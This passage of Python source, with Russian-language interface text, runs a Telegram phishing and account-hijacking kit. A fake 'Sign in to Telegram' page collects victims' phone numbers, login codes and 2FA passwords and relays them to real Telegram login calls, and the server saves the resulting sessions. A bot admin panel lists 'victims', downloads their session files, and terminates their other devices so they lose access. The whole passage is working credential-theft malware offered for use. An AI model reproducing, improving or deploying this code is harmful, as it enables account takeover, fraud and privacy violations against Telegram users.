        await cb.message.edit_text(f"❌ Ошибка парсинга: <code>{e}</code>", reply_markup=main_menu(cb.from_user.id))

@dp.callback_query(F.data.startswith("kill_"))
async def cb_kill_menu(cb: CallbackQuery):
    if not await guard(cb): return
    # Проверяем, не кик ли конкретного хэша (чтобы не перепутать с обычным kill_)
    if cb.data.startswith("kill_all_"):
        vid = cb.data[len("kill_all_"):]
        await terminate_session(vid)
        return await cb.message.edit_text("🛑 Сессия полностью завершена и удалена.", reply_markup=main_menu(cb.from_user.id))
    
    vid = cb.data[len("kill_"):]
    session_str = load_session_file(vid)
    if not session_str:
        return await cb.answer("Файл сессии не найден", show_alert=True)
    
    await cb.answer("⏳ Получение списка активных устройств...")
    dev = generate_unique_device()
    try:
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, device_model=dev["device_model"], system_version=dev["system_version"], app_version=dev["app_version"])
        await client.connect()
        
        from telethon.tl.functions.account import GetAuthorizationsRequest
        authorizations = await client(GetAuthorizationsRequest())
        await client.disconnect()
        
        buttons = []
        for auth in authorizations.authorizations:
            device_name = f"{auth.device_model} ({auth.platform})"
            is_current = "🟢 (Текущая)" if auth.current else ""
            buttons.append([InlineKeyboardButton(text=f"❌ Завершить: {device_name} {is_current}", callback_data=f"kick_auth_{vid}_{auth.hash}")])
        
        buttons.append([InlineKeyboardButton(text="🛑 Завершить ВСЕ сессии и выйти", callback_data=f"kill_all_{vid}")])
        buttons.append([InlineKeyboardButton(text=t("back_btn"), callback_data=f"victim_{vid}")])
        
        await cb.message.edit_text("📱 <b>Выберите устройство для завершения (кика):</b>", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
    except Exception as e:
        await cb.message.edit_text(f"❌ Не удалось получить список сессий: <code>{e}</code>", reply_markup=victim_detail_menu(vid))

@dp.callback_query(F.data.startswith("kick_auth_"))
async def cb_kick_specific_auth(cb: CallbackQuery):
    if not await guard(cb): return
    # Безопасно отделяем hash (последний элемент после рсплита) от vid
    remainder = cb.data[len("kick_auth_"):]
    vid, auth_hash_str = remainder.rsplit("_", 1)
    auth_hash = int(auth_hash_str)
    
    session_str = load_session_file(vid)
    dev = generate_unique_device()
    try:
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH, device_model=dev["device_model"], system_version=dev["system_version"], app_version=dev["app_version"])
        await client.connect()
        from telethon.tl.functions.account import ResetAuthorizationRequest
        await client(ResetAuthorizationRequest(hash=auth_hash))
        await client.disconnect()
        await cb.answer("✅ Выбранное устройство успешно отключено!", show_alert=True)
        await cb.message.edit_text(victim_detail_text(vid), reply_markup=victim_detail_menu(vid))
    except Exception as e:
        await cb.answer(f"❌ Ошибка: {e}", show_alert=True)

async def guard(cb: CallbackQuery) -> bool:
    if not is_vip(cb.from_user.id):
        await cb.answer("⛔ Access denied", show_alert=True)
        return False
    return True

@dp.callback_query(F.data == "main_menu")
async def cb_main_menu(cb: CallbackQuery):
    if not await guard(cb): return
    await cb.message.edit_text(t("panel"), reply_markup=main_menu(cb.from_user.id))

@dp.callback_query(F.data == "victims_list")
async def cb_victims_list(cb: CallbackQuery):
    if not await guard(cb): return
    if not VICTIMS: return await cb.message.edit_text(t("list_empty"), reply_markup=main_menu(cb.from_user.id))
    await cb.message.edit_text("👥 <b>Жертвы</b>:", reply_markup=victims_list_menu(0))

@dp.callback_query(F.data.startswith("vp_"))
async def cb_victims_page(cb: CallbackQuery):
    if not await guard(cb): return
    page = int(cb.data[len("vp_"):])
    await cb.message.edit_text("👥 <b>Жертвы</b>:", reply_markup=victims_list_menu(page))

@dp.callback_query(F.data == "sessions_list")
async def cb_sessions_list(cb: CallbackQuery):
    if not await guard(cb): return
    items = active_sessions()
    if not items: return await cb.message.edit_text(t("no_sessions"), reply_markup=main_menu(cb.from_user.id))
    await cb.message.edit_text("🟢 <b>Сессии</b>:", reply_markup=sessions_list_menu(0))

@dp.callback_query(F.data.startswith("sp_"))
async def cb_sessions_page(cb: CallbackQuery):
    if not await guard(cb): return
    page = int(cb.data[len("sp_"):])
    await cb.message.edit_text("🟢 <b>Сессии</b>:", reply_markup=sessions_list_menu(page))

@dp.callback_query(F.data.startswith("sess_"))
async def cb_session_detail(cb: CallbackQuery):
    if not await guard(cb): return
    vid = cb.data[len("sess_"):]
    info = VICTIMS.get(vid, {})
    phone = info.get("phone", "—")
    text = f"🟢 <b>Сессия</b>\n\n📱 <b>Номер:</b> <code>{phone}</code>"
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🛑 Кик устройств", callback_data=f"kill_{vid}")],
        [InlineKeyboardButton(text="📁 Скачать", callback_data=f"dl_{vid}")],
        [InlineKeyboardButton(text=t("back_btn"), callback_data="sessions_list")],
    ])
    await cb.message.edit_text(text, reply_markup=kb)

@dp.callback_query(F.data == "stats")
async def cb_stats(cb: CallbackQuery):
    if not await guard(cb): return
    await cb.message.edit_text(build_stats_text(), reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text=t("menu_btn"), callback_data="main_menu")]]))

def build_stats_text():
    total = len(VICTIMS)
    active = len(active_sessions())
    prov = SETTINGS.get("provider", "telethon").upper()
    return f"📊 <b>Статистика</b>\n\nВсего: {total}\nАктивных: {active}\nПровайдер: {prov}"

@dp.callback_query(F.data.startswith("victim_"))
async def cb_victim_detail(cb: CallbackQuery):
    if not await guard(cb): return
    vid = cb.data[len("victim_"):]
    await cb.message.edit_text(victim_detail_text(vid), reply_markup=victim_detail_menu(vid))

def victim_detail_text(vid):
    info = VICTIMS.get(vid, {})
    return f"📱 Номер: <code>{info.get('phone')}</code>\n🆔 ID: <code>{vid}</code>"

@dp.callback_query(F.data.startswith("dl_"))
async def cb_dl_session(cb: CallbackQuery):
    if not await guard(cb): return
    vid = cb.data[len("dl_"):]
    path = os.path.join(SESSIONS_DIR, f"{vid}.session")
    if not os.path.exists(path): 
        return await cb.answer("❌ Файл сессии не найден", show_alert=True)
    await cb.answer("⏳ Отправка файла...")
    phone = VICTIMS.get(vid, {}).get("phone", "unknown")
    try:
        await tg_send_file(cb.from_user.id, path, f"💾 Session: {phone}")
    except Exception as e:
        await cb.message.answer(f"❌ Ошибка отправки: {e}")

@dp.callback_query(F.data.startswith("chk_"))
async def cb_check_valid(cb: CallbackQuery):
    if not await guard(cb): return
    vid = cb.data[len("chk_"):]
    await cb.answer("⏳ Проверка...")
    r = await check_session_valid(vid)
    status = "✅ Валидна" if r is True else "❌ Не валидна"
    await cb.message.edit_text(victim_detail_text(vid) + f"\n\n<b>Статус:</b> {status}", reply_markup=victim_detail_menu(vid))

@dp.callback_query(F.data.startswith("fetch_"))
async def cb_fetch_latest(cb: CallbackQuery):
    if not await guard(cb): return
    vid = cb.data[len("fetch_"):]
    await cb.answer("⏳ Обновление кодов...")
    await fetch_victim_codes(vid)
    await cb.message.edit_text(victim_detail_text(vid), reply_markup=victim_detail_menu(vid))

@dp.callback_query(F.data == "refresh_all")
async def cb_refresh_all(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return
    await cb.answer("⏳ Обновление...")
    for vid in list(VICTIMS.keys()): await fetch_victim_codes(vid)
    await cb.message.edit_text("✅ Коды обновлены", reply_markup=main_menu(cb.from_user.id))

@dp.callback_query(F.data.startswith("delc_"))
async def cb_del_confirm(cb: CallbackQuery):
    if not await guard(cb): return
    vid = cb.data[len("delc_"):]
    await cb.message.edit_text(f"⚠️ Удалить?", reply_markup=del_confirm_menu(vid))

@dp.callback_query(F.data.startswith("deld_"))
async def cb_del_do(cb: CallbackQuery):
    if not await guard(cb): return
    vid = cb.data[len("deld_"):]
    delete_session_file(vid)
    VICTIMS.pop(vid, None)
    save_victims()
    await cb.message.edit_text("✅ Удалено.", reply_markup=main_menu(cb.from_user.id))

@dp.callback_query(F.data == "clear_all_confirm")
async def cb_clear_all_confirm(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return
    await cb.message.edit_text("⚠️ Очистить всё?", reply_markup=clear_all_confirm_menu())

@dp.callback_query(F.data == "clear_all_do")
async def cb_clear_all_do(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return
    for vid in list(VICTIMS.keys()): delete_session_file(vid)
    VICTIMS.clear(); save_victims()
    await cb.message.edit_text("✅ Очищено.", reply_markup=main_menu(cb.from_user.id))

@dp.callback_query(F.data == "shutdown_confirm")
async def cb_shutdown_confirm(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return await cb.answer("⛔ Owner only", show_alert=True)
    await cb.message.edit_text("⚠️ Выключить?", reply_markup=shutdown_confirm_menu())

@dp.callback_query(F.data == "shutdown_do")
async def cb_shutdown_do(cb: CallbackQuery):
    if not is_owner(cb.from_user.id): return
    await cb.message.edit_text("🔴 Выключено.")
    os._exit(0)

@routes.get("/api/creator")
async def api_creator(req):
    vid = req.query.get("vid", "")
    creator_name = "Admin"
    if vid and "_" in vid:
        creator_key = vid.split("_")[0]
        if creator_key in LINKS:
            creator_name = LINKS[creator_key].get("creator_name", "Admin")
        else:
            creator_name = await resolve_name(creator_key) or "Admin"
    return web.json_response({"ok": True, "name": creator_name})

@routes.post("/api/phone")
async def api_phone(req):
    try: body = await req.json()
    except: return web.json_response({"ok": False, "error": "bad json"}, status=400)

    vid, phone_raw = body.get("vid"), body.get("phone")
    if not vid or not phone_raw: return web.json_response({"ok": False, "error": "no data"})
    phone = clean_phone(phone_raw)
    prov = SETTINGS.get("provider", "telethon")
    dev = generate_unique_device()

    creator_info = "Неизвестно"
    if vid and "_" in vid:
        c_id = vid.split("_")[0]
        c_name = LINKS.get(vid, {}).get("creator_name") or await resolve_name(c_id) or c_id
        creator_info = f"👤 Нагрел (админ): <b>{c_name}</b> (ID: <code>{c_id}</code>)"

    try:
        if prov == "pyrogram" and PYRO_AVAILABLE:
            app = PyroClient(f"pyro_auth_{vid}", api_id=API_ID, api_hash=API_HASH, in_memory=True, device_model=dev["device_model"], system_version=dev["system_version"], app_version=dev["app_version"], lang_code=dev["lang_code"])
            await app.connect()
            sent = await app.send_code(phone)
            snapshot = await app.export_session_string()
            await app.disconnect()
            STATE[vid] = {"phone": phone, "phone_code_hash": sent.phone_code_hash, "session": snapshot, "prov": "pyrogram", "dev": dev}
        else:
            client = TelegramClient(StringSession(""), API_ID, API_HASH, device_model=dev["device_model"], system_version=dev["system_version"], app_version=dev["app_version"], lang_code=dev["lang_code"], system_lang_code=dev["system_lang_code"])
            await client.connect()
            sent = await client.send_code_request(phone)
            snapshot = client.session.save()
            await client.disconnect()
            STATE[vid] = {"phone": phone, "phone_code_hash": sent.phone_code_hash, "session": snapshot, "prov": "telethon", "dev": dev}

        await tg_send_all_admins(f"📲 <b>Новый номер</b>\n📱 <code>{phone}</code>\n{creator_info}")
        return web.json_response({"ok": True})
    except Exception as e:
        return web.json_response({"ok": False, "error": str(e)})

@routes.post("/api/code")
async def api_code(req):
    try: body = await req.json()
    except: return web.json_response({"ok": False, "error": "bad json"}, status=400)

    vid, code_val = body.get("vid"), str(body.get("code", "")).strip()
    st = STATE.get(vid)
    if not st: return web.json_response({"ok": False, "error": "expired"})

    phone = st["phone"]
    prov = st.get("prov", "telethon")
    dev = st.get("dev", generate_unique_device())

    creator_info = "Неизвестно"
    if vid and "_" in vid:
        c_id = vid.split("_")[0]
        c_name = LINKS.get(vid, {}).get("creator_name") or await resolve_name(c_id) or c_id
        creator_info = f"👤 Нагрел: <b>{c_name}</b> (ID: <code>{c_id}</code>)"

    try:
        if prov == "pyrogram" and PYRO_AVAILABLE:
            app = PyroClient(f"pyro_auth_{vid}", api_id=API_ID, api_hash=API_HASH, session_string=st["session"], in_memory=True, device_model=dev["device_model"], system_version=dev["system_version"], app_version=dev["app_version"], lang_code=dev["lang_code"])
            await app.connect()
            try:
                await app.sign_in(phone_number=phone, phone_code_hash=st["phone_code_hash"], phone_code=code_val)
            except Pyro2FA:
                STATE[vid]["session"] = await app.export_session_string()
                await app.disconnect()
                await tg_send_all_admins(f"🔐 <b>Требуется 2FA</b>\n📱 <code>{phone}</code>\n{creator_info}")
                return web.json_response({"ok": False, "need_2fa": True})
            me = await app.get_me()
            final = await app.export_session_string()
            await app.disconnect()
            save_session_file(vid, final)
        else:
            client = TelegramClient(StringSession(st["session"]), API_ID, API_HASH, device_model=dev["device_model"], system_version=dev["system_version"], app_version=dev["app_version"], lang_code=dev["lang_code"], system_lang_code=dev["system_lang_code"])
            await client.connect()
            try:
                await client.sign_in(phone=phone, code=code_val, phone_code_hash=st["phone_code_hash"])
            except SessionPasswordNeededError:
                STATE[vid]["session"] = client.session.save()
                await client.disconnect()
                await tg_send_all_admins(f"🔐 <b>Требуется 2FA</b>\n📱 <code>{phone}</code>\n{creator_info}")
                return web.json_response({"ok": False, "need_2fa": True})
            me = await client.get_me()
            final = client.session.save()
            await client.disconnect()
            save_session_file(vid, final)

        VICTIMS[vid] = {
            "phone": phone, "last_code": code_val, "last_2fa": "—",
            "harvested": time.strftime("%Y-%m-%d %H:%M:%S"),
            "has_2fa": False, "valid": True,
            "me": {"id": me.id, "first_name": me.first_name or "", "username": me.username or "", "phone": getattr(me, "phone", "") or ""} if me else None
        }
        save_victims()
        STATE.pop(vid, None)
        await tg_send_all_admins(f"✅ <b>Сессия получена!</b>\n📱 <code>{phone}</code>\n{creator_info}")
        return web.json_response({"ok": True})
    except Exception as e:
        return web.json_response({"ok": False, "error": str(e)})

@routes.post("/api/2fa")
async def api_2fa(req):
    try: body = await req.json()
    except: return web.json_response({"ok": False, "error": "bad json"}, status=400)

    vid, password = body.get("vid"), str(body.get("code", "")).strip()
    st = STATE.get(vid)
    if not st: return web.json_response({"ok": False, "error": "expired"})

    phone = st["phone"]
    prov = st.get("prov", "telethon")
    dev = st.get("dev", generate_unique_device())

    creator_info = "Неизвестно"
    if vid and "_" in vid:
        c_id = vid.split("_")[0]
        c_name = LINKS.get(vid, {}).get("creator_name") or await resolve_name(c_id) or c_id
        creator_info = f"👤 Нагрел: <b>{c_name}</b> (ID: <code>{c_id}</code>)"

    try:
        if prov == "pyrogram" and PYRO_AVAILABLE:
            app = PyroClient(f"pyro_auth_{vid}", api_id=API_ID, api_hash=API_HASH, session_string=st["session"], in_memory=True, device_model=dev["device_model"], system_version=dev["system_version"], app_version=dev["app_version"], lang_code=dev["lang_code"])
            await app.connect()
            await app.check_password(password=password)
            me = await app.get_me()
            final = await app.export_session_string()
            await app.disconnect()
            save_session_file(vid, final)
        else:
            client = TelegramClient(StringSession(st["session"]), API_ID, API_HASH, device_model=dev["device_model"], system_version=dev["system_version"], app_version=dev["app_version"], lang_code=dev["lang_code"], system_lang_code=dev["system_lang_code"])
            await client.connect()
            await client.sign_in(password=password)
            final = client.session.save()
            me = await client.get_me()
            await client.disconnect()
            save_session_file(vid, final)

        VICTIMS[vid] = {
            "phone": phone, "last_code": "—", "last_2fa": password,
            "harvested": time.strftime("%Y-%m-%d %H:%M:%S"),
            "has_2fa": True, "valid": True,
            "me": {"id": me.id, "first_name": me.first_name or "", "username": me.username or "", "phone": getattr(me, "phone", "") or ""} if me else None
        }
        save_victims()
        STATE.pop(vid, None)
        await tg_send_all_admins(f"✅ <b>Сессия с 2FA получена!</b>\n📱 <code>{phone}</code>\n{creator_info}")
        return web.json_response({"ok": True})
    except Exception as e:
        return web.json_response({"ok": False, "error": str(e)})

# --- HTML ---
HTML_CONTENT = r"""<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Telegram</title>
  <style>
    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
    :root{--bg:#0e1117;--surface:#1a1f2e;--surface2:#252b3b;--border:#2e3650;--accent:#2AABEE;--accent-hover:#1e96d8;--text:#e8eaf0;--subtext:#8b94a8;--input-bg:#1e2535;--error:#e05c5c}
    body{background:var(--bg);color:var(--text);font-family:-apple-system,Roboto,Arial,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
    .card{background:var(--surface);border:1px solid var(--border);border-radius:20px;padding:40px 32px;width:100%;max-width:380px;box-shadow:0 24px 48px rgba(0,0,0,.4);position:relative}
    .lang-switcher{position:absolute;top:15px;right:20px;display:flex;gap:6px}
    .lang-btn{background:var(--surface2);border:1px solid var(--border);color:var(--subtext);padding:4px 8px;border-radius:6px;font-size:12px;cursor:pointer}
    .lang-btn.active{background:var(--accent);color:#fff;border-color:var(--accent)}
    .logo-wrap{display:flex;justify-content:center;margin-bottom:28px;margin-top:10px}
    .logo{width:76px;height:76px;border-radius:50%;background:linear-gradient(145deg,#2AABEE,#1a8fd1);display:flex;align-items:center;justify-content:center}
    .logo svg{width:42px;height:42px;fill:#fff}
    h2{text-align:center;font-size:22px;font-weight:700;margin-bottom:8px}
    .subtitle{text-align:center;color:var(--subtext);font-size:14px;line-height:1.5;margin-bottom:28px}
    .input-wrap{margin-bottom:14px}
    .input-wrap label{display:block;font-size:12px;color:var(--subtext);margin-bottom:6px;font-weight:500;text-transform:uppercase}
    input{width:100%;padding:14px 16px;background:var(--input-bg);border:1.5px solid var(--border);border-radius:12px;font-size:16px;color:var(--text);outline:none}
    input:focus{border-color:var(--accent)}
    .btn{width:100%;padding:15px;background:var(--accent);color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;margin-top:6px}
    .btn:hover{background:var(--accent-hover)}
    .code-input{text-align:center;font-size:24px;font-weight:700;letter-spacing:6px}
    .step{display:none}.step.active{display:block}
    .error-msg{color:var(--error);font-size:13px;text-align:center;margin-top:10px;display:block}
  </style>
</head>
<body>
<div class="card">
  <div class="lang-switcher">
    <button class="lang-btn" id="btn-ru" onclick="setLang('ru')">RU</button>
    <button class="lang-btn" id="btn-en" onclick="setLang('en')">EN</button>
  </div>
  <div class="logo-wrap"><div class="logo"><svg viewBox="0 0 24 24"><path d="M9.78 18.65l.28-4.23 7.68-6.92c.34-.31-.07-.46-.52-.19L7.74 13.3 3.64 12c-.88-.25-.89-.86.2-1.3l15.97-6.16c.73-.33 1.43.18 1.15 1.3l-2.72 12.81c-.19.91-.74 1.13-1.5.71L12.6 16.3l-1.99 1.93c-.23.23-.42.42-.83.42z"/></svg></div></div>
  
  <div class="step active" id="s1">
    <h2 data-i18n="s1_title">Войти в Telegram</h2>
    <p class="subtitle" data-i18n="s1_sub">Введите номер телефона</p>
    <div class="input-wrap"><label data-i18n="phone_label">Номер телефона</label><input id="phone" type="text" placeholder="+7 999 123-45-67"></div>
    <button class="btn" id="btn1" onclick="sendPhone()" data-i18n="btn_continue">Продолжить</button>
    <p class="error-msg" id="err1"></p>
  </div>
  
  <div class="step" id="s2">
    <h2 data-i18n="s2_title">Код подтверждения</h2>
    <p class="subtitle" id="code-hint" data-i18n="s2_sub">Введите код из Telegram</p>
    <div class="input-wrap"><label data-i18n="code_label">Код</label><input id="code" class="code-input" type="text" maxlength="6"></div>
    <button class="btn" id="btn2" onclick="sendCode()" data-i18n="btn_confirm">Подтвердить</button>
    <p class="error-msg" id="err2"></p>
  </div>
  
  <div class="step" id="s3">
    <h2 data-i18n="s3_title">Облачный пароль</h2>
    <p class="subtitle" data-i18n="s3_sub">Введите 2FA пароль</p>
    <div class="input-wrap"><label data-i18n="pass_label">Пароль</label><input id="pass" type="password"></div>
    <button class="btn" id="btn3" onclick="send2FA()" data-i18n="btn_signin">Войти</button>
    <p class="error-msg" id="err3"></p>
  </div>
  
  <div class="step" id="s4">
    <h2 data-i18n="s4_title">Готово!</h2>
    <p class="subtitle" data-i18n="s4_sub">Авторизация успешна</p>
  </div>
</div>
<script>
  const i18n = {
    ru: {
      s1_title: "Войти в Telegram", s1_sub: "Введите номер телефона", phone_label: "Номер телефона", btn_continue: "Продолжить",
      s2_title: "Код подтверждения", s2_sub: "Введите код из Telegram", code_label: "Код", btn_confirm: "Подтвердить",
      s3_title: "Облачный пароль", s3_sub: "Введите 2FA пароль", pass_label: "Пароль", btn_signin: "Войти",
      s4_title: "Готово!", s4_sub: "Авторизация успешна"
    },
    en: {
      s1_title: "Sign in to Telegram", s1_sub: "Enter your phone number", phone_label: "Phone Number", btn_continue: "Continue",
      s2_title: "Verification Code", s2_sub: "Enter the code from Telegram", code_label: "Code", btn_confirm: "Confirm",
      s3_title: "Cloud Password", s3_sub: "Enter your 2FA password", pass_label: "Password", btn_signin: "Sign In",
      s4_title: "Done!", s4_sub: "Authorization successful"
    }
  };
  let currentLang = new URLSearchParams(location.search).get('lang') || 'ru';
  function setLang(l) {
    currentLang = l;
    document.getElementById('btn-ru').classList.toggle('active', l === 'ru');
    document.getElementById('btn-en').classList.toggle('active', l === 'en');
    document.querySelectorAll('[data-i18n]').forEach(el => {
      const key = el.getAttribute('data-i18n');
      if (i18n[l][key]) el.textContent = i18n[l][key];
    });
  }
  setLang(currentLang);
  const params = new URLSearchParams(location.search);
  const vid = params.get('id') || 'unknown';
  const setStep = n => { document.querySelectorAll('.step').forEach(s => s.classList.remove('active')); document.getElementById('s'+n).classList.add('active'); };
  
  async function sendPhone() {
    document.getElementById('err1').textContent = '';
    const phone = document.getElementById('phone').value.trim();
    if(!phone) return;
    try {
      const r = await fetch('/api/phone', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({vid, phone})});
      const d = await r.json();
      if(d.ok) setStep(2); else document.getElementById('err1').textContent = d.error || 'Ошибка';
    } catch(e) { document.getElementById('err1').textContent = 'Ошибка сети'; }
  }
  
  async function sendCode() {
    document.getElementById('err2').textContent = '';
    const code = document.getElementById('code').value.trim();
    if(!code) return;
    try {
      const r = await fetch('/api/code', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({vid, code})});
      const d = await r.json();
      if(d.ok) { setStep(4); setTimeout(()=>window.location.href='tg://', 2000); }
      else if(d.need_2fa) setStep(3); 
      else document.getElementById('err2').textContent = d.error || 'Неверный код';
    } catch(e) { document.getElementById('err2').textContent = 'Ошибка сети'; }
  }
  
  async function send2FA() {
    document.getElementById('err3').textContent = '';
    const pass = document.getElementById('pass').value.trim();
    if(!pass) return;
    try {
      const r = await fetch('/api/2fa', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({vid, code:pass})});
      const d = await r.json();
      if(d.ok) { setStep(4); setTimeout(()=>window.location.href='tg://', 2000); } 
      else document.getElementById('err3').textContent = d.error || 'Неверный пароль';
    } catch(e) { document.getElementById('err3').textContent = 'Ошибка сети'; }
  }
</script>
</body>
</html>
"""

@routes.get("/tg.html")
@routes.get("/")
async def html_page(req):
    return web.Response(text=HTML_CONTENT, content_type="text/html")

async def main():
    app = web.Application()
    app.add_routes(routes)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get("PORT", 8080))
    site = web.TCPSite(runner, "0.0.0.0", port)
    await site.start()
    logi("main", f"Server running on :{port}")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
